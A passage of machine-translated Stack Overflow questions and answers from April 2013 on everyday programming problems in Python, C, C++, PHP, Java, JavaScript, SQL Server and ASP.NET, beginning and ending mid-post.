    Return the minimum number of buses required to transport n people.
    Each bus can hold 50 people.

    >>> num_buses(75)
    2
    """
    bus = int()
    if(n>=0):
        bus = int(math.ceil(n/50.0))
    return bus 
```

我正在尝试编写测试代码，但他们给了我失败的结果 - 这是我开始的代码：

```
import a1
import unittest

class TestNumBuses(unittest.TestCase):
    """ Test class for function a1.num_buses. """
    def test_numbuses_1(self):
        actual = num_buses(75)
        expected = 2
        self.assertEqual(actual, expected)

    # Add your test methods for a1.num_buses here.

if __name__ == '__main__':
    unittest.main(exit=False) 
```

当我按 F5 运行模块时 - 这就是我得到的 -

```
E
======================================================================
ERROR: test_numbuses_1 (__main__.TestNumBuses)
----------------------------------------------------------------------
Traceback (most recent call last):
  File "C:\1-blog-cacher\TestNumBuses.py", line 8, in test_numbuses_1
    actual = num_buses(75)
NameError: global name 'num_buses' is not defined

----------------------------------------------------------------------
Ran 1 test in 0.050s

FAILED (errors=1) 
```

所以我的测试失败了——尽管它应该通过，因为乘客人数是 75 人，每辆公共汽车最多可以容纳 50 人——除此之外，任何其他的都会导致数字四舍五入。

谁能看到我如何让测试用例工作以及我编写测试代码的地方出错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T07:35:12.247

在您的单元测试文件中，您必须`import num_buses`.

这解决了你的直接问题，但如果你已经定义`num_buses`了，`a1`那么你必须这样做，`a1.num_buses`否则 Python 会认为这`num_buses`是一个全局函数。

```
import a1
import unittest
import num_buses

class TestNumBuses(unittest.TestCase):
    """ Test class for function a1.num_buses. """
    def test_numbuses_1(self):
        actual = num_buses(75) #a1.num_buses(75) <-
        expected = 2
        self.assertEqual(actual, expected)

    # Add your test methods for a1.num_buses here.

if __name__ == '__main__':
    unittest.main(exit=False) 
```

检查一下：[Cyber​​-Dojo 测试](http://cyber-dojo.com/?id=5A75B99774)- 只需按下恢复，然后`test_untitled.py`按下 TEST 按钮。

# c++ - 关键字auto的惊人有用的用法

> ID：15847183
> 
> 赞同：3
> 
> 时间：2013-04-06T05:01:27.553
> 
> 标签：c++, variables, auto

这个迷人的发现让我有点惊讶，我想知道依靠它有多“安全”。

该`auto`关键字在历史上很少被使用，因为无论如何它都是隐含的：

```
{ auto int x=5; } 
```

是相同的：

```
{ int x=5; } 
```

所以我在 Stackoverflow 上摸索，这是我强烈推荐的一个很棒的网站。我发现了这个迷人的金块：[在新的 c++ 中，您可以使用它`auto`来推断类型。](https://stackoverflow.com/a/2193201/768472)

这确实减少了很多打字。例如，我现在正在处理的不是这个：

```
 std::chrono::high_resolution_clock::time_point 
     t1 = std::chrono::high_resolution_clock::now(); 
```

我可以这样做：

```
 auto t2(std::chrono::high_resolution_clock::now()); 
```

所以我想知道的是……我经常这样做对养成的习惯有多好？

Stackoverflow 上的“auto”标签表示，当可以“明确推断”该类型是什么时，此关键字有效。这对我来说意味着这是一个非常安全和良好的习惯，只要你不打算支持老一代语言的编译器。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T05:10:55.183

您可以向 Google 学习，他与我们其他人分享了关于首选使用“汽车”的智慧：

> 使用 auto 避免类型名称过于混乱。在有助于可读性的情况下继续使用清单类型声明，并且除了局部变量之外，永远不要使用 auto 。

[在http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml#auto](http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml#auto)阅读更多

# ios6 - Cocos2d 中的菜单按钮

> ID：15847189
> 
> 赞同：0
> 
> 时间：2013-04-06T05:02:11.470
> 
> 标签：ios6, cocos2d-iphone, xcode4.5

我试图在 Cocos2d 的游戏主菜单上制作播放按钮，这是一个图像文件。我使用图像 Play Button.png 将精灵设置为 playButton。当我运行该应用程序时，它给了我一个错误“itemFromNormalSprite:selectedSprite:target:selector”。已弃用。有人有解决这个问题的方法吗？这是我的代码：

```
CCMenuItem *playGameButton = [CCMenuItemSprite itemFromNormalSprite:playButton selectedSprite:playButton target:self selector:@selector(buttonTapped:)];
    CCMenu *menu = [CCMenu menuWithItems:playGameButton, nil];
    menu.position = ccp(size.width/2, size.height/1.5);
    [self addChild:menu z:5]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T19:22:56.520

```
 CCMenuItem *playGameButton = [CCMenuItemImage itemFromNormalImage:playButton selectedImage:playButton disabledImage:disabledPlayButton target:self selector:@selector(buttonTapped:)];
    CCMenu *menu = [CCMenu menuWithItems:playGameButton, nil];
    menu.position = ccp(size.width/2, size.height/1.5);
    [self addChild:menu z:5]; 
```

# c - 链表数据都一样

> ID：15847194
> 
> 赞同：1
> 
> 时间：2013-04-06T05:03:08.143
> 
> 标签：c, linked-list

我正在尝试从 .txt 文件中读取输入，并将其添加到单链表中。我遇到的问题是节点正在正确创建和连接（我得到正确的长度），但是在添加所有节点之后，每个数据字段都是相同的。我想知道问题是什么，以及如何解决它。一直在努力！

添加功能：

```
#include "linkedList.h"
#include <stdlib.h>
#include <string.h>

void addOrdered(Node ** Head,char * input)
{

        printf("\nInput: %s\n",input);

        Node * cur = (*Head);

        Node * newNode = malloc(sizeof(Node));
        newNode->Data = malloc(sizeof(Person));

        newNode->Data->FName = strtok(input," ");
        newNode->Data->LName = "test";
        newNode->Data->id = 5;
        newNode->Next = NULL;

        if(cur == NULL)
        {
            (*Head) = newNode;
        }
        else
        {

            for(;cur->Next != NULL;cur = cur->Next)
            {
                printf(" Cur->Next ");
            }

            cur->Next = newNode;
        }
} 
```

处理文件：

```
void processFile(Node ** Head, FILE * fd)
{
    char * input = malloc(sizeof(char)*SIZE);

    while(fgets(input,SIZE,fd) != NULL)
    {
        addOrdered(Head,input);
    }

    free(input);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:05:42.667

strtok 返回指向在字符串中找到的最后一个标记的指针。如果没有要检索的令牌，则返回空指针。你需要做类似的事情`pch = strtok(input," ");`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:05:52.447

您的代码中的错误是：`newNode->Data->FName`一旦您调用 processFile() 函数并访问可用内存，地址分配将变得无效，`free(input)`这会在运行时导致“未定义行为”。

要更正您的代码：

而不是简单的分配，例如：

```
newNode->Data->FName = strtok(input," "); 
```

在单独的内存中分配和复制如下：

```
char *ptr =  strtok(input," ");
newNode->Data->FName = malloc(strlen(ptr)+1);
strcpy(newNode->Data->FName, ptr); 
```

实际上，您是`input`在 addOrdered() 中从地址空间分配内存地址并`free()`在 `processFile()`函数中生成。

我在下面详细解释了您的代码：

先读：[char * strtok ( char * str, const char * delimiters );](http://www.cplusplus.com/reference/cstring/strtok/) 手动的：

> 在第一次调用时，该函数需要一个 C 字符串作为 str 的参数，其第一个字符用作扫描标记的起始位置。在随后的调用中，该函数需要一个空指针，并使用最后一个标记结束后的位置作为新的扫描起始位置。
> 
> **返回值**
> 
> 指向在字符串中找到的最后一个标记的指针。如果没有要检索的令牌，则返回空指针。

它*不会发送新的内存*，而是`input`您最近释放的内存（）。为了理解 strtok() 函数的工作，我编写了以下代码：

```
int main (){
  char str[] ="- This, a sample string.";
  printf("str address: %p, ends on:  %p \n", str, str+strlen(str));
  printf ("Splitting string \"%s\" into tokens:\n",str);
  char * pch;
  pch = strtok (str," ,.-");
  while (pch != NULL){
    printf ("pch: %7s,  address: %p\n",pch, pch);
    pch = strtok (NULL, " ,.-");
  }
  return 0;
} 
```

上述程序的执行（*每次运行时地址可能不同*）：

```
~$ ./a.out 
str address: 0x7fff96958d50, ends on:  0x7fff96958d68 
Splitting string "- This, a sample string." into tokens:
pch:    This,  address: 0x7fff96958d52
pch:       a,  address: 0x7fff96958d58
pch:  sample,  address: 0x7fff96958d5a
pch:  string,  address: 0x7fff96958d61 
```

**注意：** *`pch`地址来自/在`str`地址范围内。*

同样，在您的代码中，分配给`newNode->Data->FName = strtok(input," ");`函数`addOrdered()`。内存地址值位于 `newNode->Data->FName`/来自`input`您最近在`processFile()`函数中释放的位置因此`newNode->Data->FName`变得无效并且您的代码作为未定义的行为运行

```
void addOrdered(Node ** Head,char * input){

        printf("\nInput: %s\n",input);
        // some code here
                                                     step-2 
        newNode->Data->FName = strtok(input," "); <--"assign memory"  
                                                ^
      //  Some code here                        |
}                                               |   
                                                |  
void processFile(Node ** Head, FILE * fd){      |    step-1
    char * input = malloc(sizeof(char)*SIZE); <-|----"Allocate memory"
    while(fgets(input,SIZE,fd) != NULL){        |
        addOrdered(Head,input); -----------------
    }                                                step-3  
    free(input); <-----------------------------------"Free memory"
}

So, "What is assign to newNode->Data->FName becomes invalid" 
```

**其次**，您应该从缓冲区中的文件中少读一个字符，为 null 保留空间`\0`。

```
fgets(input, SIZE-1, fd) 
```

# php - 会话在不同目录的页面之间不起作用

> ID：15847197
> 
> 赞同：1
> 
> 时间：2013-04-06T05:03:39.283
> 
> 标签：php, apache, session

从前两天开始我一直在研究这个问题，但仍然无法解决。

我在根目录中有两个脚本，其中会话注册并在我再次访问页面时保持持久，但是当我要从子目录脚本访问页面时，建议没有注册会话。

详细解释如下：

问题是当我从根目录脚本 start_session() 是：[http](http://www.kstreethome.com/test.php) ://www.kstreethome.com/test.php它工作正常

/test.php 的代码

```
<?php

error_reporting(E_ALL);

echo "This is session save path : " . session_save_path() . "</br>";
//echo phpinfo();
    if(!isset($_SESSION['User']))
    {
        echo "Session not set </br>";
                    session_start();
                    $_SESSION['User'] = "Hiren";
                    $_SESSION['AccessType'] = "U";
                    $_SESSION['UserType'] = "W";
                    $_SESSION['UserID'] = "123";
                    $_SESSION['DataUser'] = "Test";
                    $_SESSION['Password'] = "Test";

        echo session_id();

        echo $_SESSION['User'];
        echo $_SESSION['AccessType'];
        echo $_SESSION['UserType'];
        echo $_SESSION['UserID'];
        echo $_SESSION['DataUser'];
        echo $_SESSION['Password'];     
    }
    else
    {
    echo "Session set </br>";

            echo $_SESSION['User'];
        echo $_SESSION['AccessType'];
        echo $_SESSION['UserType'];
        echo $_SESSION['UserID'];
        echo $_SESSION['DataUser'];
        echo $_SESSION['Password']; 

    }

?> 
```

但

当我从子目录 Ajax 脚本 start_session() 是：[http](http://www.kstreethome.com/Ajax/test.php) ://www.kstreethome.com/Ajax/test.php它不起作用但是在这个脚本中它正在存储会话并且可以在同一次运行中访问但是当我重新加载/ Ajax/test.php 会话刚刚被破坏，我必须重新开始。

/Ajax/test.php 的代码

```
<?php

error_reporting(E_ALL);

echo "This is session save path : " . session_save_path() . "</br>";
//echo phpinfo();
    if(!isset($_SESSION['User']))
    {
        echo "Session not set </br>";
                    session_start();
                    $_SESSION['User'] = "Hiren";
                    $_SESSION['AccessType'] = "U";
                    $_SESSION['UserType'] = "W";
                    $_SESSION['UserID'] = "123";
                    $_SESSION['DataUser'] = "Test";
                    $_SESSION['Password'] = "Test";

        echo session_id();

        echo $_SESSION['User'];
        echo $_SESSION['AccessType'];
        echo $_SESSION['UserType'];
        echo $_SESSION['UserID'];
        echo $_SESSION['DataUser'];
        echo $_SESSION['Password'];     
    }
    else
    {
    echo "Session set </br>";

            echo $_SESSION['User'];
        echo $_SESSION['AccessType'];
        echo $_SESSION['UserType'];
        echo $_SESSION['UserID'];
        echo $_SESSION['DataUser'];
        echo $_SESSION['Password']; 

    }

?> 
```

两个文件中的代码相同，用于测试目的

另一个奇怪的事情是，在根脚本/test.php中它说会话路径''默认为null，因为我没有更改默认值inn php.ini，但在脚本/Ajax/test.php中它说会话保存路径是/ tmp 很奇怪吧？

不用说它在我的本地服务器上运行良好，但在托管服务器上运行良好，所以请在这个问题上指导我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T05:05:17.893

放在`session_start()`每一页的顶部

```
<?php
 session_start();
 error_reporting(E_ALL); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T05:08:41.993

在使用之前，您需要开始会话

```
 <?php 
 session_start();
 // your code
 ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T05:07:17.453

您需要在访问 $_SESSION 之前调用 session_start()。将它放在每个脚本的顶部，看看是否能解决问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-06T05:09:50.250

总是以`session_start()`

```
<?php
 session_start();
 error_reporting(E_ALL); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-06T05:16:51.973

获取或设置任何会话值之前的第一行中的用户`<?php session_start()`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-06T05:09:28.197

您需要`session_start()`在使用 $_SESSION 之前调用，但我真的建议您制作一个包装类来为您处理所有这些，这样您就不会遇到一堆混乱。

```
$session = new Session();
$session->set('key', 'val'); 
```

# c# - 如何在asp.net中启用菜单项

> ID：15847199
> 
> 赞同：-1
> 
> 时间：2013-04-06T05:03:50.843
> 
> 标签：c#, asp.net, rad-controls

如何在 ASP.NET 中执行此操作？

```
main.Items[0].Enabled = false;
main.Items[1].Enabled = false;
folder.Items[0].Enabled = false;
folder.Items[1].Enabled = false; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:56:11.440

如果您想在角色基础上启用/禁用菜单项，那么您可以在项目中使用站点地图并根据用户角色轻松显示隐藏菜单。

```
<?xml version="1.0" encoding="utf-8" ?>
<siteMap xmlns="http://schemas.microsoft.com/AspNet/SiteMap-File-1.0" >
  <siteMapNode url="" roles="*">
    <!--<siteMapNode url="Default.aspx" title="Home" description="" roles="*" />-->
    <siteMapNode url="Dash.aspx" title="Dash" description="admin" roles="KAM,Admin,QMR"  />
    <siteMapNode url="~Manage.aspx" title="Complaint List"  description="" roles="Public,Admin"  />
    <siteMapNode url="~/Manage1.aspx" title="title1"  description="" roles="role1,Admin"  />
    <siteMapNode url="~/Manage2.aspx" title="title2"  description="" roles="role2,Admin" />
    <siteMapNode url="~/ManageUsers.aspx" title="Administration"  description="admin" roles="Admin"   />
    <siteMapNode url="" title="Reports"  description="admin" roles="Admin" >
      <siteMapNode url="Manage4.aspx" title="Manage123"  description="admin" roles="Admin"   />
      <siteMapNode url="Summary.aspx" title="Summary"  description="admin" roles="Admin"   />
    </siteMapNode>
  </siteMapNode>
</siteMap> 
```

# java - 来自文本文件的 Java 输入参数

> ID：15847200
> 
> 赞同：1
> 
> 时间：2013-04-06T05:03:55.593
> 
> 标签：java

我想知道如何从命令行将数据从文本文件获取到 java 程序。我正在使用窗户。

我用了

```
Java myprogram < c:\inputfile.txt 
```

它不起作用，但是当我使用

```
Java myprogram good 
```

有用。“好”是我用它作为输入的词

仅供参考：当我使用

```
Java myprogram good > c:\outfile.txt 
```

这是用于将输出写入文本文件..

我需要从文本文件“inputfile.txt”中读取并写入“outputfile.txt”

我用这个

```
Java myprogram "c:\\inputfile.txt" > "c:\\outputfile.txt" 
```

但不工作

我使用的这段代码

```
import edu.smu.tspell.wordnet.*;

public class myprogram{
public static void main (String [] args) {

System.setProperty("wordnet.database.dir", "C:\\Program Files (x86)\\WordNet\\2.1\\dict\\");
WordNetDatabase database = WordNetDatabase.getFileInstance();
      String result = "";
        NounSynset nounSynset;
        NounSynset[] hyponyms;
        Synset[] synsets = database.getSynsets(args[0]);

        for (int i = 0; i < synsets.length; i++) { //iteratre over all senses
            String[] wordForms = synsets[i].getWordForms();
            for (int j = 0; j < wordForms.length; j++) {
                System.out.println(wordForms[j]);
            }

} 

}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:16:46.587

如果您需要从文件中读取输入数据，那么您需要在 Java 类中编写用于读取文本文件的代码以进行读取。

您的代码似乎只是从命令行获取输入，而您将其`command line argument`视为数据。

**[请参阅此示例，了解如何从文本文件中读取输入。](http://java67.blogspot.in/2012/11/how-to-read-file-in-java-using-scanner-example.html)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:07:43.453

像这样在双引号中传递值：

```
Java myprogram good > "c:\\inputfile.txt" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:35:24.440

下面的 cmd 仅适用于 unix 风格的操作系统。

```
 java classfile > "/path/logfilename.log" 
```

下面的程序将读取文件并写入不同的文件（您可以根据您的用例进行改进）

```
 public class ReadWriteFile {

        public static void main(String args[]) throws Exception {

        if (args.length == 0) {
            System.out.println("Enter the file name");
        } else {

            String fileName = args[0];

            BufferedReader input = new BufferedReader(new FileReader(fileName));

            String line = null;

            BufferedWriter writer = new BufferedWriter( new FileWriter( "output.txt"));

            try {
                while (( line = input.readLine()) != null){
                    System.out.println(line);
                    //or
                    writer.write(line);
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if(input != null) input.close();                
                if ( writer != null) writer.close( );
            }
        }
    } 
```

}

对于逐个字符的阅读，请参阅下面的 [how-do-i-read-input-character-by-character-in-java](https://stackoverflow.com/questions/811851/how-do-i-read-input-character-by-character-in-java)

# javascript - 如何在 JavaScript 中引用父变量？像 _parent.myvar

> ID：15847205
> 
> 赞同：0
> 
> 时间：2013-04-06T05:04:38.553
> 
> 标签：javascript, variables, scope

我在脚本的主根中设置了变量

```
var name="blah"; 
```

我需要从一个函数中引用它，而无需直接在其参数中传递它。我可以使用“var”初始化程序在全局范围内设置变量，这对我的函数有效。但是，出于类似的原因，我仍然需要知道如何执行此操作。

在 Flash (AS2/AS3) 中，它就像`_root.myvar`或一样简单`_parent.myvar`

在 JS 中？

样本：

```
var name="blah";
var sex="m";
templateMe('name,sex'); // declared the actual NAME of the var not the var itself 
```

然后.. templateMe 函数简单地使用传递给函数的“字符串”作为变量名及其对应值

意味着“名称”字符串变为

```
var name=eval(name) 
```

这是函数的一部分：

```
vars_r =  vars.split(",");
r_count = vars_r.length;

if(r_count < 1 ){
    return template;
}

var i=0;
var needles = new Array();
var replacements  = new Array();;
for(i=0; i < 2; i++){ //ti <-- use own i counter coz it conflicts w/ global i
    needles.push("{{"+ vars_r[i] + "}}");
    replacements.push( eval( vars_r[i]) );

} 
```

ETC...

希望这现在更有意义

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:22:34.270

全局变量是`window`对象的属性。因此，如果您需要在一个名为 的字符串变量中有名称时引用全局变量`varname`，您可以使用`window[varname]`，如下所示：

```
var foo = 'bar';
var varname = 'foo';
console.log( window[varname] ); 
```

打印：

```
bar 
```

正如 Stephen 指出的那样，可能有更好的方法来解决整体问题，但如果您确实需要以这种方式访问​​全局变量，这种方法可以正常工作。

查看您的代码，我认为您将替换此行：

```
replacements.push( eval( vars_r[i]) ); 
```

和：

```
replacements.push( window[ vars_r[i] ] ); 
```

虽然我不确定我是否理解这段代码在做什么。无论如何，`window[varname]`都比`eval(varname)`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:51:39.760

如果我正确理解您的问题，则根本不需要传递变量。

这些变量已经是全局的，因此您可以直接引用它们。

例如：

```
var value1 = "some value";  /* these variables are global, so you can refer to them from anywhere in your script */
var value2 = 25;            /* ********************************************* */
someFunction(); 
```

someFunction 看起来像这样：

```
function someFunction() {
    var newValue = value2 + 3; 
    alert(newValue); /* Alerts 28\. */
    alert(value1); /* Alerts 'some value'. */
} 
```

如果您需要一个学习 JavaScript 的地方，[webplatform.org](http://webplatform.org)可能是[一个不错的起点](http://docs.webplatform.org/wiki/javascript)。

希望这可以帮助！

# javascript - 我需要从脚本中删除 rel 属性平均值，而不是图像 id 或任何值

> ID：15847219
> 
> 赞同：0
> 
> 时间：2013-04-06T05:06:07.293
> 
> 标签：javascript, jquery, html

我需要从脚本中删除 rel 值，而不是图像 id 或任何值，我的意思是某种方式来生成 rel 属性或删除，或者只是采取某种方式来避免这个属性

HTML

文本在这里关闭 X

```
<article class="col img_prev2">
  <img src="img/slideshow/slideshow2.jpg" alt="#img2" rel="1" class="thumb_main_page">
  <h5>Text Here</h5>
</article>

<article class="col img_prev2">
  <img src="img/slideshow/slideshow3.jpg" alt="#img2" rel="2" class="thumb_main_page">
   <h5>Text Here</h5>

  <div id="img3" class="login-popup">
  </div>

</article> 
```

脚本

```
var number = $(this).attr('rel');
    number = parseInt(number);
    $('#carousel .slides li:nth-child(' + (number + 1) + ')').click();
    $('#carousel').flexslider({
        animation: "slide",
        controlNav: false,
        animationLoop: false,
        slideshow: false,
        itemWidth: 105,
        itemMargin: 5,
        startAt: number,
        asNavFor: '#slider'
    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:36:50.150

### jQuery`.removeAttr()`

> **描述**：从匹配元素集中的每个元素中删除一个属性。 ¹

在您的情况下，最基本的形式是：

```
$(img).removeAttr('rel'); 
```

¹ [http://api.jquery.com/removeAttr/](http://api.jquery.com/removeAttr/)

# shell - ProcessBuilder.start() 返回 0 但不执行 shell 脚本

> ID：15847231
> 
> 赞同：2
> 
> 时间：2013-04-06T05:08:05.347
> 
> 标签：shell, servlets, processbuilder

我正在尝试使用 ProcessBuilder 从运行在 WebSphere Application Server 上的 Servlet 在我的 Linux 服务器上执行 shell 脚本。

代码返回 0（使用 .waitFor()），但脚本似乎没有执行。如果我给脚本设置了一个无效的路径，我会得到一个“找不到文件”异常，所以我知道它正在查找脚本......但似乎没有执行。

该脚本本身调用另一个脚本，该脚本最终应该输出一个 zip 文件（我还有一个“触摸”行，看看那里是否发生了任何事情……但什么也没做）。

该脚本从命令行运行良好，使用与我通过 .start() 传递的相同命令。

这是我的 Servlet 的一个片段：

```
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

    System.out.println("in doPost");

    System.out.println("about to kick off ProcessBuilder");
    ProcessBuilder pb = new ProcessBuilder("/opt/IBM/WebSphere/AppServer/profiles/AppSrv01/installedApps/localhostNode01Cell/Svc_war.ear/Svc.war/test.sh");
    pb.redirectErrorStream(true);
    Process process = pb.start();
    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
    int ch;
    while ((ch = br.read()) != -1)
        System.out.println((char)ch);
    br.close();
    try {
        int exitVal = process.waitFor();
        System.out.println("Exit Value: " + exitVal);
    } catch (InterruptedException e) {
        e.printStackTrace();
    } 
```

.redirectErrorStream() 和 .getInputStream() 是为了看看我是否会遇到一些我读过其他人提到的缓冲区问题（尽管如果是这种情况，我不希望 .waitFor() 返回 0）。

这是我第一次涉足 ProcessBuilder，所以我希望我只是遗漏了一些明显的东西。

任何想法/提示将不胜感激。

哦，是的......这是我得到的输出：

```
[4/5/13 21:32:41:791 PDT] 0000004d SystemOut     O in doPost
[4/5/13 21:32:41:791 PDT] 0000004d SystemOut     O about to kick off ProcessBuilder
[4/5/13 21:32:41:818 PDT] 0000004d SystemOut     O Exit Value: 0 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T18:35:31.570

让它工作....我需要使用以下方法设置工作目录：

```
pb.directory(new File("/opt/IBM/WebSphere/AppServer/profiles/AppSrv01/installedApps/localhostNode01Cell/Svc_war.ear/Svc.war/")); 
```

所以最终的解决方案看起来像：

```
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

System.out.println("in doPost");

System.out.println("about to kick off ProcessBuilder");
ProcessBuilder pb = new ProcessBuilder("/opt/IBM/WebSphere/AppServer/profiles/AppSrv01/installedApps/localhostNode01Cell/Svc_war.ear/Svc.war/test.sh");
pb.redirectErrorStream(true);
pb.directory(new File("/opt/IBM/WebSphere/AppServer/profiles/AppSrv01/installedApps/localhostNode01Cell/Svc_war.ear/Svc.war/"));
Process process = pb.start();
BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
int ch;
while ((ch = br.read()) != -1)
    System.out.println((char)ch);
br.close();
try {
    int exitVal = process.waitFor();
    System.out.println("Exit Value: " + exitVal);
} catch (InterruptedException e) {
    e.printStackTrace();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-30T18:56:49.773

您只需将 shell 脚本放在工作目录中。这样做时，您不需要通过执行 pb.directory("directory") 来设置 ProcessBuilder 的目录

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:21:02.753

> 该脚本从命令行运行良好，使用与我通过 .start() 传递的相同命令。

我敢打赌，问题是当您从命令行测试它时，您是在一个用户帐户下进行的，而 WebSphere 在另一个帐户下运行它。这两个帐户可能具有不同的访问权限、不同`$PATH`的设置等。shell 脚本在一个帐户下工作的事实并不意味着它可以在另一个帐户下工作。你需要测试一下。

# sql-server-2008-r2 - SQL server 2008 r2 TOP 是如何工作的？

> ID：15847236
> 
> 赞同：0
> 
> 时间：2013-04-06T05:09:16.163
> 
> 标签：sql-server-2008-r2

TOP 究竟是如何工作的？

我已经完成了[TOP(Transact-SQL)](http://msdn.microsoft.com/en-IN/library/ms189463%28v=sql.105%29.aspx)。我了解 TOP 用于限制结果集。但我不明白的是，假设我指定`Select Top(10) from Table where some condition`它在处理表中的前 10 条记录后停止，该表可能只包含符合条件的 5 条记录，或者它会先处理所有记录，然后返回结果集的前 10 条记录。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:11:51.840

是的，第二个假设是正确的。

> 首先它将处理所有记录，然后返回结果集的前 10 条记录。

数据库引擎将忽略**TOP**子句运行查询，然后最后将该结果集缩小到所请求的**n**行数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-09T09:36:39.277

正确答案存在于这个[线程](https://dba.stackexchange.com/questions/24832/how-and-why-does-top-impact-an-execution-plan)中。实际上，SQL Server 2008 使用不同的模型来执行查询。

# java - 在Java中获取用户当前的经纬度

> ID：15847249
> 
> 赞同：4
> 
> 时间：2013-04-06T05:10:51.957
> 
> 标签：java, geolocation, location

我看到这个问题在这里问了很多关于 Java 的问题，但我看到的每一个问题似乎都是以 Android 为中心的：当他们来自计算机而不是移动设备时，我需要一种获取用户当前纬度和经度的方法。我知道这在 C# 中是可行的，但我不确定如何在 Java 中做到这一点。我之前使用过 Google Maps 的 restful API：但是，它需要一个地址作为输入，而我只想获取用户当前的纬度/经度，我觉得这比调用 Google 更简单。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T05:21:24.280

一般来说，您不能对计算机执行此操作的原因是，当您考虑它时，一般计算机非常明显：

*   计算机一般没有内置 GPS 设备。因此，计算机无法告诉您基于此的位置。

*   另一种方法是尝试将 IP 地址映射到物理位置。这是不可靠的，因为 IP 地址从根本上与物理位置无关。通过 IP 地址进行地理定位仅适用于用户的网络服务提供商能够（并且愿意）向第三方提供位置信息的情况。在实践中，这些信息非常“零散”。另一个问题是您需要依赖外部“地理定位服务”来获取信息。它不是标准 Java 平台的一部分。

*   还有另一种基于地理定位 WiFi 热点¹的方法。此链接更详细： http: [//gps.about.com/od/glossary/g/wifi_position.htm](http://gps.about.com/od/glossary/g/wifi_position.htm)。然而，这取决于用户的 WiFi 提供商注册他们的纬度/经度，以及用户打开 WiFi。

* * *

^(1 - 我记得一位从事 iPhone 开发的同事提到，当 WiFi 打开时，他在 iPhone（带 GPS）上获得了更准确的地理位置。)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-06T10:50:58.273

Java 目前不提供通用的独立于平台的 API 来获取位置。但是，可能存在特定于平台的方式。

台式机上的大多数实现将通过 IP 地址进行地理定位；您可以从 Java 中使用这些服务（[在 Java 中获取地理位置的最佳方式](https://stackoverflow.com/questions/1415851/best-way-to-get-geo-location-in-java)）。但是，如果操作系统提供更通用的 API，它可以利用任何 GPS 硬件。

对于 Mac OS，[https://superuser.com/questions/346302/is-there-a-way-to-access-os-x-location-services-from-the-command-line](https://superuser.com/questions/346302/is-there-a-way-to-access-os-x-location-services-from-the-command-line)

这里有[Gnome 提供的库](http://techchicblog.wordpress.com/2013/03/08/last-month-of-opw-internship/)的详细信息，还有[KDE 支持计划的](http://lwn.net/Articles/436937/)记录。

# recursion - 使用递归附加链表

> ID：15847251
> 
> 赞同：0
> 
> 时间：2013-04-06T05:11:19.303
> 
> 标签：recursion, insert, linked-list, append, nodes

我想要一个调用私有递归插入函数的插入函数，该函数将下一个数字添加到链表的末尾。我在应该使用哪些参数以及递归插入函数中应该使用哪些参数时遇到问题。我在想递归插入函数需要一个节点指针来递归地单步执行。

```
class LinkedList{
    private:
        struct Node{
            int data; //stores data in nodes
            Node* next;
            ~Node(){delete next;}
        };
    public:
    LinkedList(){ first = NULL;}
    ~LinkedList(){delete first;}

    void print() const {
      print( first );
    }
    void insert(const int d){ //here is where the first insert method is
    insert(first, d);
    }
private:
    Node* first; 
```

这是我坚持的功能......

```
void insert(Node* p, const int d){ //this is the private recursive one
        Node* temp = new Node;
        temp->data=d;
        if(p->next == NULL) p->next = temp;
        else insert(p->next, d);
        }

};

int main() {
int a[] = { 1, 2, 3, 4, 5, 6};
LinkedList list;
  for(int i=0; i<6; i++)
    list.insert( a[i] );
} 
```

我想知道如何通过获取不同的参数来使插入函数重载。我还想知道我是否正确地单步执行了递归函数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-07T00:22:19.340

调用递归函数的函数应该是这样的

```
void insert(const int d){
        insert(first, d);
    } 
```

递归函数应该看起来像

```
void insert(Node*& p, const int d){
    Node* temp = new Node;
    temp->data=d;
    if(p == NULL) p = temp;
    else insert(p->next, d);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T07:16:47.857

您希望在分配新节点之前到达列表的末尾。下面的这个版本与你目前写的最兼容。

```
void insert(Node*& p, const int d) {
    if (p == NULL) { // reached the end, so allocate new node and set value
        p = new Node;
        p->data = d;
        p->next = NULL;
    }
    else
        insert(p->next, d);
} 
```

# python - 重命名文件时 Python 访问被拒绝

> ID：15847253
> 
> 赞同：0
> 
> 时间：2013-04-06T05:11:31.143
> 
> 标签：python

我正在为学校做一个项目来重命名一些文件并创建和处理文件。一些文件在 C 盘中，我需要绕过：

```
Traceback (most recent call last):
